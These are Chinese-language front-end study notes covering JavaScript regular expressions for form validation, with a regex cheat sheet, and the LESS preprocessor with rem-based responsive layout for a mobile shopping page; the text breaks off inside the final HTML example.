>[danger] #####  忽略大小写 -- i
```
//所有的h都替换成S
var str="HhpphH";//SSppSS
str=str.replace(/[h]/gi,"S");
console.log(str);
```

>[danger] ##### 根据正则获取文本（在正则对象的角度） -- exec
```
var str = "中国移动:10086,中国联通:10010,中国电信:10000";
var reg=/\d{5}/g;
//通过正则表达式匹配这个字符串
var array=reg.exec(str);
while (array!=null){
  //输出匹配的内容
  console.log(array[0]);
  array=reg.exec(str);
}
```
>[success] # 验证密码长度
![](https://box.kancloud.cn/35286a05cddf355242600d3162629bec_364x108.png)
```
1.多个if 组合可以形成多个 条件或组合（特别重要）
2.通过改变classname 来改变每个阶段的显示效果
```
>[danger] ##### 案例
```
    <style>
        #dv{
            width:300px;
            height: 200px;
            position: absolute;
            left: 300px;
            top:100px ;
        }
        .strengthLv0{
            height: 6px;
            width: 120px;
            border: 1px solid #cccccc;
            padding: 2px;
        }

        .strengthLv1{
            background-color: red;
            height: 6px;
            width: 40px;
            border: 1px solid #cccccc;
            padding: 2px;
        }
        .strengthLv2 {
            background: orange;
            height: 6px;
            width: 80px;
            border: 1px solid #ccc;
            padding: 2px;
        }

        .strengthLv3 {
            background: green;
            height: 6px;
            width: 120px;
            border: 1px solid #ccc;
            padding: 2px;
        }
    </style>
</head>
<body>
<div id="dv">
    <label for="pwd">密码</label>
    <input type="text" id="pwd" maxlength="16">
    <div>
        <em>密码强度</em>
        <em id="strength"></em>
        <div id="strengthLevel" class="strengthLv0"></div>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('pwd').onkeyup =function () {
        // this 一定常用
        if(this.value.length>=6){
            var lvl= getLevel(this.value);
            my$('strengthLevel').className="strengthLv"+lvl
        }else{
            my$("strengthLevel").className="strengthLv0";
        }
        
        // my$("strengthLevel").className="strengthLv"+(this.value.length)>=6?getLevel(this.value) :0);
    }

    // 判断 密码等级
    // level1 只有数字字母或者特殊符号
    // level2 数字和字母, 数字和特殊符号, 字母和特殊符号
    // 三者都有: 数字和字母和特殊符号------3级-----强

    function getLevel(pwd) {
        var level = 0;
        var reNum = /[0-9]/
        var reLetter = /[a-zA-Z]/
        var reSign = /[^0-9a-zA-Z_]/
        // if 判断 如果有数字+1 如果有字母+1 如果有 特殊符号+1.多层if 结构形成多层组合判断
        if(reNum.test(pwd)){
            level++
        }
        if(reLetter.test(pwd)){
            level++
        }
        if(reSign.test(pwd)){
            level++
        }
        return level
    }

</script>
```
>[success] # 判断用户输入的邮箱格式
```
1.先把正则表达式单独提取
2.然后做条件判断
3.失去焦点做正则判断
```
>[danger] ##### 代码
```
请您输入邮箱地址:<input type="text" value="" id="email"/> *<br/>
<script>
    document.getElementById("email").onblur = function () {
        var reg = /^[0-9a-zA-Z_.-]+[@][0-9a-zA-Z_.-]+([.][a-zA-Z]+){1,2}$/;
        if(reg.test(this.value)){
            this.style.backgroundColor = "green"
        }else{
            this.style.backgroundColor = "red";
        }
    }

</script>
```
>[success] # 验证用户中文
```
1.[\u4e00-\u9fa5] 中文范围判断
```
>[danger] ##### 案例
```
请输入您的名字:<input type="text" value="" id="userName" />*<br/>
<script>
  //是中文名字,则绿色,否则红色
  document.getElementById("userName").onblur=function () {
    var reg=/^[\u4e00-\u9fa5]{2,6}$/;
    if(reg.test(this.value)){
      this.style.backgroundColor="green";
    }else{
      this.style.backgroundColor="pink";
    }
  };


  //[\u4e00-\u9fa5]    [一-龥]
```
>[success] # 多个表单验证
```
1.写一个方法用来专门判断每一个input的value
2.利用nextElementSibling获取下个兄弟元素span
3.严格模式^\d{5,11}$/
```
>[danger] ##### 代码
```
  <style type="text/css">
    body {
      background: #ccc;
    }

    label {
      width: 40px;
      display: inline-block;
    }

    span {
      color: red;
    }

    .container {
      margin: 100px auto;
      width: 400px;
      padding: 50px;
      line-height: 40px;
      border: 1px solid #999;
      background: #efefef;
    }

    span {
      margin-left: 30px;
      font-size: 12px;
    }

    .wrong {
      color: red
    }

    .right {
      color: green;
    }

    .defau {
      width: 200px;
      height: 20px;
    }

    .de1 {
      background-position: 0 -20px;
    }
  </style>

</head>

<body>
<div class="container" id="dv">
  <label for="qq">Q Q</label><input type="text" id="qq"><span></span><br/>
  <label>手机</label><input type="text" id="phone"><span></span><br/>
  <label>邮箱</label><input type="text" id="e-mail"><span></span><br/>
  <label>座机</label><input type="text" id="telephone"><span></span><br/>
  <label>姓名</label><input type="text" id="fullName"><span></span><br/>
</div>
<script src="common.js"></script>
<script>

  //qq的
  checkInput(my$("qq"),/^\d{5,11}$/);
  //手机
  checkInput(my$("phone"),/^\d{11}$/);
  //邮箱
  checkInput(my$("e-mail"),/^[0-9a-zA-Z_.-]+[@][0-9a-zA-Z_.-]+([.][a-zA-Z]+){1,2}$/);
  //座机号码
  checkInput(my$("telephone"),/^\d{3,4}[-]\d{7,8}$/);
  //中文名字
  checkInput(my$("fullName"),/^[\u4e00-\u9fa5]{2,6}$/);
  //给我文本框,给我这个文本框相应的正则表达式,我把结果显示出来
  //通过正则表达式验证当前的文本框是否匹配并显示结果
  function checkInput(input,reg) {
    //文本框注册失去焦点的事件
    input.onblur=function () {
      if(reg.test(this.value)){
        this.nextElementSibling.innerText="正确了";
        this.nextElementSibling.style.color="green";
      }else{
        this.nextElementSibling.innerText="让你得瑟,错了吧";
        this.nextElementSibling.style.color="red";
      }
    };
  }

</script>
```
[TOC]
>[danger] ##### 一、校验数字的表达式
```
1 数字：^[0-9]*$
2 n位的数字：^\d{n}$
3 至少n位的数字：^\d{n,}$
4 m-n位的数字：^\d{m,n}$
5 零和非零开头的数字：^(0|[1-9][0-9]*)$
6 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$
7 带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$
8 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$
9 有两位小数的正实数：^[0-9]+(.[0-9]{2})?$
10 有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$
11 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$
12 非零的负整数：^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$
13 非负整数：^\d+$ 或 ^[1-9]\d*|0$
14 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$
15 非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$
16 非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$
17 正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$
18 负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$
19 浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$
```



>[danger] ##### 二、校验字符的表达式
```
1 汉字：^[\u4e00-\u9fa5]{0,}$
2 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$
3 长度为3-20的所有字符：^.{3,20}$
4 由26个英文字母组成的字符串：^[A-Za-z]+$
5 由26个大写英文字母组成的字符串：^[A-Z]+$
6 由26个小写英文字母组成的字符串：^[a-z]+$
7 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$
8 由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$
9 中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$
10 中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$
11 可以输入含有^%&',;=?$\"等字符：[^%&',;=?$\x22]+
12 禁止输入含有~的字符：[^~\x22]+
```

>[danger] ##### 三、特殊需求表达式
```
1 Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$
2 域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?
3 InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$
4 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$
5 电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$ 
6 国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7}
7 身份证号：
15或18位身份证：^\d{15}|\d{18}$
15位身份证：^[1-9]\d{7}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}$
18位身份证：^[1-9]\d{5}[1-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{4}$
8 短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$
9 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$
10 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$
11 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 
12 日期格式：^\d{4}-\d{1,2}-\d{1,2}
13 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$
14 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 
15 钱的输入格式：
16 1.有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：^[1-9][0-9]*$ 
17 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 
18 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 
19 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 
20 5.必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：^[0-9]+(.[0-9]{2})?$ 
21 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$ 
22 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 
23 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ 
24 备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里
25 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$
26 中文字符的正则表达式：[\u4e00-\u9fa5]
27 双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))
28 空白行的正则表达式：\n\s*\r (可以用来删除空白行)
29 HTML标记的正则表达式：<(\S*?)[^>]*>.*?|<.*? /> (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)
30 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)
31 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)
32 中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)
33 IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用)
```
>[success] # less
```
[官网](http://lesscss.org/)
[中文网](http://lesscss.cn/)  http://www.1024i.com/demo/less/
```
```
1.本质上，LESS 包含一套自定义的语法及一个解析器，用户根据这些语法定义自
己的样式规则，这些规则最终会通过解析器，编译生成对应的 CSS 文件。LESS 
并没有裁剪 CSS 原有的特性，更不是用来取代 CSS 的，而是在现有 CSS 语法的
基础上，为 CSS 加入程序式语言的特性。
```
>[danger] ##### 安装less
```
1.先安装nodejs
2.输入指令 npm install –g less  其中-g 代表全局变量
3.把less 文件解析成css，找到less文件目录，输入指令 lessc 文件.less 转换的.css
```

>[danger] ##### 使用webstorm 配置less 解析
```
1.先创建一个less 文件，会出现一个配置，选中less解析路径
```
![](https://box.kancloud.cn/ab1ffdf82a7f252cd7d3ddfb301c8039_1032x44.png)
****
![](https://box.kancloud.cn/06b346bbd13b83275180003660f48eb3_750x158.png)
>[success] # less 变量声明
```
1.开头调用格式化说明 ---  @charset "UTF-8"
2.注释在生成的css 文件上可以看打这个注释 --- /****/ 
3.注释在css 文件上看不到这个注释  --- //
4.声明变量使用 --- @符号
4.调用样式名称用字符串拼接例如class调用  --- .@{变量名称}{}
```
>[danger] ##### less 文件
```
 @charset "UTF-8";
/*注释：在css当中可以使用，所有编译的过程当中生成在css文件*/
//注释：css不支持,不会编译在css文件

/*变量*/
//必须@前缀，：是等于的以上，必须分号结束；
//不能以数组开头，不能包含特殊字符，区分大小写
@mainColor:#e92323;
@className:box;

div{
  background: @mainColor;
}
a:hover{
  color: @mainColor;
}
//变量用于字符拼接使用方法
.@{className}{
  color: @mainColor;
}
```
>[danger] ##### 生成的css
```
@charset "UTF-8";
/*注释：在css当中可以使用，所有编译的过程当中生成在css文件*/
/*变量*/
div {
  background: #e92323;
}
a:hover {
  color: #e92323;
}
.box {
  color: #e92323;
}

```
>[success] # Mixin 混合使用
```
1.Mixin（混入）功能对用开发者来说并不陌生，很多动态语言都支持 Mixin（混
入）特性，它是多重继承的一种实现，在 LESS 中，混入是指在一个 CLASS 中
引入另外一个已经定义的 CLASS，就像在当前 CLASS 中增加一个属性一样。
```
>[danger] ##### less 案例样式引入
```
1.样式加()调用使用
```
* less
```
@charset "UTF-8";
/*组合样式的例子*/
.w50{
  width: 50%;
}
.f_left{
  float: left;
}
.f_right{
  float: right;
}
/*类混入*/
.w50-f_left{
 .w50();
 .f_left();
}
```
* css
```
@charset "UTF-8";
/*组合样式的例子*/
.w50 {
  width: 50%;
}
.f_left {
  float: left;
}
.f_right {
  float: right;
}
/*类混入*/
.w50-f_left {
  width: 50%;
  float: left;
}
/*# sourceMappingURL=test.css.map */
```

>[danger] ##### 定义函数样式
```
1.无参样式 名字( ){ } 格式例如.w50(){width: 50%;}
2.有参样式 名字(@变量:定义值){ } 格式，例如 .f(@direction:left{float:@direction;}
3.定义了参数（没有默认值），调用的时候必须传参
4.怎么定义默认值 和定义变量值是一样的
5.定义了参数（有默认值），可传可不传
```
* less
```
@charset "UTF-8";

.w50(){
  width: 50%;
}

.f(@direction:left){
  float: @direction;
}
.borderRadius(@width:100px){
  border-radius: @width;
  -webkit-border-radius:@width;
  -moz-border-radius:@width;
  -o-border-radius:@width;
  -ms-border-radius:@width;
}
.w50-f_left{
  .w50();
  .f(right);
  .borderRadius(20px);
}

/**快速调用兼容样式封装**/
.wcy{
  .borderRadius()
}
```
* css
```
@charset "UTF-8";
.w50-f_left {
  width: 50%;
  float: right;
  border-radius: 20px;
  -webkit-border-radius: 20px;
  -moz-border-radius: 20px;
  -o-border-radius: 20px;
  -ms-border-radius: 20px;
}
/**快速调用兼容样式封装**/
.wcy {
  border-radius: 100px;
  -webkit-border-radius: 100px;
  -moz-border-radius: 100px;
  -o-border-radius: 100px;
  -ms-border-radius: 100px;
}
/*# sourceMappingURL=test.css.map */
```
>[success] # @import 引入样式
```
1.在一个less 文件下引入其他文件的less 内容
``` 
>[danger] ##### 案例
* less
```
@charset "UTF-8";

@import "variables";

@import "mixins";

@import "topBar";

@import "banner";
```
* css 
```
1.效果是会把这些文件的less内容在，生成css的时候展示在一起
```
>[success] # 生成层级关系的css
```
1.当我们想用less生成的css 产生的效果如: .top img{} 这种可以使用嵌套
2.当我们想让实现 一些伪类选择器 例如 a:hover{} 我们应该嵌套前缀加&
```
>[dange] ##### 案例说明
* less
```css
@charset "UTF-8";
.wjs_app{
  display: block;
  img{
    display: none;
  }
  /*需要连接的情况：&*/
  &:hover{
    img{
      display: block;
      position: absolute;
      left: 50%;
      margin-left:-60px;
      border: 1px solid #ccc;
      border-top: none;
      top:40px;
      z-index: 100000;
    }
  }
  > div{
    display: block;
  }
}
```

* css
```
@charset "UTF-8";
.wjs_app {
  display: block;
  /*需要连接的情况：&*/
}
.wjs_app img {
  display: none;
}
.wjs_app:hover img {
  display: block;
  position: absolute;
  left: 50%;
  margin-left: -60px;
  border: 1px solid #ccc;
  border-top: none;
  top: 40px;
  z-index: 100000;
}
.wjs_app > div {
  display: block;
}
/*# sourceMappingURL=test.css.map */
```
>[success] # less 计算
```
1.可以用less 产生计算生成css
2.less中也有一些内置函数
```
>[danger] ##### 案例
```
/*运算*/
@num:5;
ul{
  width: 100%*@num;
  li{
    width: 100%/@num;
    color: red+yellow+blue;
    background: gray*0.3;
    /*内置函数*/
    border-color: darken(red,20%);
  }
}
```
* css
```
/*运算*/
ul {
  width: 500%;
}
ul li {
  width: 20%;
  color: #ffffff;
  background: #262626;
  /*内置函数*/
  border-color: #990000;
}
/*# sourceMappingURL=test.css.map */
```
>[success] # less 在浏览器端自解析
```
1. 之前都是使用cmd指令对less 文件进行转译成css，在浏览器端想让，浏览器识别less，使用less.min.js包
2. 在引入声明less 文件上和css也略有不同，要声明是less文件type="text/less"
3. 这样是手动刷新的时候会把新的less 文件编程css，如果想自动刷新调用js方法less.watch()
```
>[danger] ##### 案例
```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" type="text/less" href="../less/test.less">
    <script src="../lib/less/less.min.js"></script>
    // 只是为了在编写的时候减少刷新使用
    <script>less.watch();</script>
</head>
<body>
<h3>在浏览器端使用less</h3>
<p>1.less无法在浏览器端直接使用</p>
<p>2.浏览器不识别</p>
<p>3.必须解析成css代码</p>
<p>4.通过less解析插件（javascript）</p>
<p>5.引入less文件需要加上 type="text/less" </p>
<p>6.less.watch(); 无刷新预览样式</p>
<p>7.以http形式打开网页预览</p>
</body>
</html>
```
>[success] # 使用less 编写
```
1.伸缩布局 flex
2.流式布局 百分比
3.响应式布局 利用多媒体@media
4.他们都只能对元素的宽进行屏幕改变的时候适配，而不能达到高度随屏幕变化而变化
```
>[danger] ##### 分析第四点
```
1.可以使用js监听屏幕的大小，从而实现宽度的改变，略麻烦
2.可以利用@media 配合rem 来适配，在配合less快速生成宽高变化css
```
>[danger] ##### rem 和 em 区别
```
1.em 是大小是相当于父类元素字体大小
2.rem的大小是基于 是root 根元素相对于html标签
```
>[danger] ##### 利用rem 特性适配比例
```
1 把页面上px单位转换成rem单位
2 页面制作的时候 psd 上的量取的px转成rem使用
3 预设一个基准值 方便计算 100px ，预设值指的是当前提供设计稿
4 适配的时候设置基准值  320px  50px 怎么算：（640px 100px ===320px 50px）
5 换算公式：当前rem基准值 = 预设的基准值 / 设计稿宽度 * 当前设备的宽度 
```
>[danger] ##### 基础案例
```
1.设计稿的宽度640px，设置html font-size：100px为预设值，设计稿上的字体大小为
 32px，所以比例应该为0.32rem，用公式求出在414 的屏幕中html大小100/640*414等 
 于64.6875，也就时说不用去关心，初始化在header 设置的rem 的值，而是要计算每一个
屏幕大小不同下html的容器字体大小
```
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>Title</title>
    <style>
        /*假设的设备  320px 414px 640px */
        @media (min-width: 320px) {
            html{
                font-size: 50px;
            }
        }
        @media (min-width: 414px) {
            html{
                font-size: 64.6875px;
            }
        }
        @media (min-width: 640px) {
            html{
                font-size: 100px;
            }
        }
        body{
            margin: 0;
            padding: 0;
            font-size: 14px;
        }
        /*流式容器*/
        header{
            width: 100%;
            height: 1rem;
            line-height: 1rem;
            font-size: 0.32rem;
            text-align: center;
            background: green;
            color: #fff;
        }
    </style>
</head>
<body>
<header>购物车</header>
</body>
</html>
```
[TOC]
>[success] # less目录设置
![](https://box.kancloud.cn/743f19f21ba10a570111f7333e2e1972_200x254.png)
``` 
1.var.less --- 用来保存变量
2.mixins.less --- 编写函数的
3.adapter.less --- 调用适配函数的
4.reset.less --- 重置样式配置
5.根据项目可以分出一些 topBar banner nav 等less 文件配置
6.在index 总文件引入这些配置即可 
```
>[danger] ##### index.less
```
1.引入效果如下
//变量  
@import "var";  
//混入  
@import "mixins";  
//适配  
@import "adapter";  
//重置样式  
@import "reset";  
//模块  
@import "topBar";  
@import "banner";  
@import "nav";  
@import "tabs";
```
>[success] # 各模块的less编写

>[danger] ##### var.less 一些变量设置
``` css
@charset "UTF-8";
//变量
//rem适配方案不好维护  设备会更新  设计稿尺寸  预设基准值
//适配主流设备十几种
@adapterDeviceList:750px,720px,640px,540px,480px,424px,414px,400px,384px,375px,360px,320px;
//设计稿尺寸
@psdWidth:750px;
//预设基准值
@baseFontSize:100px;
//设备的种类
@len:length(@adapterDeviceList);
//主体颜色
@snColor:#fabc09;
```
>[danger] ##### mixins.less 编写函数的
```
//遍历使用的是for循环
//less没有循环语法
//使用函数的迭代 死循环
//根据数组的长度去停止当前循环
//给函数的执行附加条件
//需要序号来判断  通过序号遍历 @index 1 开始
//遍历成功
// when 用来less 循环使用的
.adapterMixin(@index) when ( @index > 0){
  @media (min-width: extract(@adapterDeviceList,@index)){
    html{
      font-size: @baseFontSize / @psdWidth * extract(@adapterDeviceList,@index);
    }
  }
  .adapterMixin( @index - 1);
}
```
>[danger] ##### adapter.less 调用mixins.less 函数适配
```
.adapterMixin(@len);
```
>[danger] ##### reset.less 重置函数配置
```css
*,
*::before,
*::after{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  tap-highlight-color: transparent;
  -webkit-tap-highlight-color: transparent;
}
body{
  font-size: 14px;
  font-family: "Microsoft YaHei",sans-serif;
  color: #333;
}
ul,ol{
  list-style: none;
}
a{
  text-decoration: none;
  color: #333;
}
input,textarea{
  border: none;
  outline: none;
  resize: none;
  -webkit-appearance: none;
}
.f_left{
  float: left;
}
.f_right{
  float: right;
}
.clearFix::before,
.clearFix::after{
  content: "";
  display: block;
  visibility: hidden;
  height: 0;
  line-height: 0;
  clear: both;
}
.m_l10{
  margin-left:10px;
}
.m_r10{
  margin-right:10px;
}
.m_t10{
  margin-top:10px;
}
.m_b10{
  margin-bottom:10px;
}
/*版心*/
.sn_container{
  position: relative;
  width: 100%;
  max-width: 750px;
  min-width: 320px;
  margin: 0 auto;
   // 为了让轮播图在导航栏下面，因为导航栏fixed 脱离文档流，所以对应下移轮播图的高度
  padding-top: 90rem/@baseFontSize;
  padding-bottom: 100rem/@baseFontSize;
}
```
>[danger] ##### 顶部通栏 topBar.less
```
1.所有高度一定要设置对应的rem 对比
```
```
// 所有的高度要计算出对应的比例
.sn_topBar{
  width: 100%;
  height: 90rem/@baseFontSize;
  background: @snColor;
  position: fixed;
  left: 0;
  top: 0;
  z-index: 999;
  a{
    position: absolute;
    top: 0;
    width: 90rem/@baseFontSize;
    height: 90rem/@baseFontSize;
    // 并集元素 中间没有空格
    &.icon_category{
      left: 0;
      background: url("../images/icon_category.png") no-repeat center / 44rem/@baseFontSize 70rem/@baseFontSize;
    }
    &.icon_cart{
      right: 0;
      background: url("../images/icon_cart.png") no-repeat center / 63rem/@baseFontSize 68rem/@baseFontSize;
    }
  }
  form{
    width: 100%;
    padding: 0 90rem/@baseFontSize;
    position: relative;
    .icon_search{
      width: 30rem/@baseFontSize;
      height: 30rem/@baseFontSize;
      position: absolute;
      left: 100rem/@baseFontSize;
      top: 30rem/@baseFontSize;
      background: url("../images/icon_search.png") no-repeat center / 27rem/@baseFontSize 28rem/@baseFontSize;
    }
    input{
      width: 100%;
      height: 60rem/@baseFontSize;
      margin-top: 15rem/@baseFontSize;
      border-radius: 5rem/@baseFontSize;
      background: rgba(255,255,255,0.3);
      font-size: 24rem/@baseFontSize;
      padding-left:50rem/@baseFontSize;
    }
  }
}
```
>[danger] ##### 轮播图 banner.less
``` css
.sn_banner{
  width: 100%;
  overflow: hidden;
  position: relative;
  ul{
    &:first-child{
      width: 100%*10;
      transform: translateX(-100%/10);
        // 加了多余显示图片，第一张实际是底八张所以移动显示实际第一张
      -webkit-transform: translateX(-100%/10);
      li{
        width: 100%/10;
        float: left;
        a{
          display: block;
          width: 100%;
          img{
            display: block;
            width: 100%;
          }
        }
      }
    }
    &:last-child{
      position: absolute;
      right: 20rem/@baseFontSize;
      bottom: 20rem/@baseFontSize;
      li{
        margin-left: 12rem/@baseFontSize;
        width: 12rem/@baseFontSize;
        height: 12rem/@baseFontSize;
        border-radius: 50%;
        float: left;
        background: #fff;
        &.now{
          background: @snColor;
        }
      }
    }
  }
}
```
>[danger] ##### nav.less 导航栏
```css
.sn_nav{
  width: 100%;
  padding: 10rem/@baseFontSize;
  ul{
    width: 100%;
    li{
      width: 20%;
      float: left;
      a{
        display: block;
        width: 100%;
        img{
          display: block;
          width: 80rem/@baseFontSize;
          height: 80rem/@baseFontSize;
          margin: 0 auto;
        }
        p{
          text-align: center;
          font-size: 20rem/@baseFontSize;
          padding: 5rem/@baseFontSize;
          color: #666;
        }
      }
    }
  }
}
```
>[danger] ##### tabs.less 底部通栏
```
.sn_tabs{
  width: 100%;
  height: 100rem/@baseFontSize;
  position: fixed;
  bottom: 0;
  left: 0;
  background: #fff;
  border-top: 1px solid #ccc;
  ul{
    width: 100%;
    li{
      width: 20%;
      float: left;
      padding-top: 10rem/@baseFontSize;
      a{
        display: block;
        width: 100%;
        text-align: center;
        span{
          font-size: 40rem/@baseFontSize;
        }
        p{
          padding-top: 5rem/@baseFontSize;
          font-size: 20rem/@baseFontSize;
          color: #666;
        }
      }
    }
  }
}
```
>[danger] ##### 整体html
![](https://box.kancloud.cn/89abb4805be11bef12c2445bda01d01c_771x752.png)
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>Title</title>
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/less" href="less/index.less">
    <script src="lib/less/less.min.js"></script>
</head>
<body>
<!--版心-->
<div class="sn_container">
    <!--顶部通栏-->
    <header class="sn_topBar">
        <a href="#" class="icon_category"></a>
        <form action="#">
            <span class="icon_search"></span>
            <input type="search" placeholder="60寸电视免费拿">
        </form>
        <a href="#" class="icon_cart"></a>
    </header>
    <!--轮播图-->
    <div class="sn_banner">
        <ul>
            <li><a href="#"><img src="images/banner08.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner01.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner02.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner03.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner04.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner05.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner06.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner07.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner08.jpg" alt=""></a></li>
            <li><a href="#"><img src="images/banner01.jpg" alt=""></a></li>
        </ul>
        <ul>
            <li class="now"></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
            <li></li>
        </ul>
    </div>
    <!--分类-->
    <nav class="sn_nav">
        <ul class="clearFix">
            <li><a href="#"><img src="images/nav01.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav02.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav03.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav04.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav05.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav01.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav02.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav03.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav04.png" alt=""><p>分类</p></a></li>
            <li><a href="#"><img src="images/nav05.png" alt=""><p>分类</p></a></li>
        </ul>
    </nav>
    <!--页签-->
    <footer class="sn_tabs">
        <ul>
            <li><a href="#"><span class="fa fa-home"></span><p>首页</p></a></li>
            <li><a href="#"><span class="fa fa-reorder"></span><p>分类</p></a></li>
            <li><a href="#"><span class="fa fa-file-text-o"></span><p>必抢清单</p></a></li>
            <li><a href="#"><span class="fa fa-user"></span><p>我的易购</p></a></li>
            <li><a href="#"><span class="fa fa-suitcase"></span><p>新手大礼包</p></a></li>
        </ul>
    </footer>
</div>
<script src="lib/zepto/zepto.min.js"></script>
<!--扩展选择器-->
<script src="lib/zepto/selector.js"></script>
<!--做动画-->
